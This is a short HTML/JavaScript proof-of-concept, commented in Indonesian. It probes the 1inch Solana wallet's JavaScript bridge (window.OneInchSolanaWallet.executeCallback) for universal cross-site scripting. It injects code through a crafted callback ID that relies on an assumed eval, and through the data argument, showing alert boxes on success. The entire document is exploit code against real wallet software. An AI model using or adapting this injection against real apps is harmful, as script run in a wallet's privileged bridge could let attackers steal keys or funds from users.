    <script>
        const log = (m) => document.getElementById('logs').innerHTML += `> ${m}<br>`;
        
        // Kita targetkan Class yang sudah kamu temukan
        const Bridge = window.OneInchSolanaWallet;

        if (Bridge && Bridge.executeCallback) {
            log("Fungsi executeCallback Ditemukan! Mengirim Payload...");

            try {
                // Skenario 1: Mencoba injeksi via ID callback
                // Kita berharap sistem melakukan: eval("callback_" + id)
                const payloadJahat = "1; alert('BOOM! UXSS 1inch Berhasil!'); //";
                
                log("Mencoba Injeksi Callback ID...");
                Bridge.executeCallback(payloadJahat, {status: "success"});

                log("Mencoba Injeksi via Data Object...");
                Bridge.executeCallback("any_id", "alert('UXSS via Data!')");

            } catch(e) {
                log("Error saat eksekusi: " + e.message);
            }
        } else {
            log("Fungsi target tidak merespon. Coba refresh.");
        }
    </script>
